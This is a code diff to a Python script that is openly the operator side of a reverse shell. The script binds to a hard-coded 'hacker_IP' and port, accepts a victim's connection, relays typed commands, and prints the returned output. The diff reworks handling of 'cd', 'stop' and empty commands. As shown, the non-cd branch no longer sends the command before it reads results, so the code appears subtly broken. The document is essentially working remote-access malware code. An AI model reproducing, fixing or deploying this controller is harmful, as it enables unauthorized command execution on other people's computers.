@@ -1,5 +1,5 @@
 import socket
-from venv.client_side import IDENTIFIER
+import os
 
 hacker_IP = '192.168.43.138'
 hacker_PORT = 8008
@@ -14,10 +14,14 @@ hacker_socket, client_address = hacker_socket.accept()
 try:
     while True:
         command = input("Enter the command you want to Run: ")
-        hacker_socket.send(command.encode())
-        if command == "stop":
+        if command.startswith("cd"):
+            hacker_socket.send(command.encode())
+            continue
+        elif command == "stop":
             hacker_socket.close()
             break
+        elif command == "":
+            continue
         else:
             full_command_result = b''
             while True:
@@ -28,5 +32,6 @@ try:
                     break
                 full_command_result += chunk
             print(full_command_result.decode())
+
 except Exception:
     print("Exception occured")
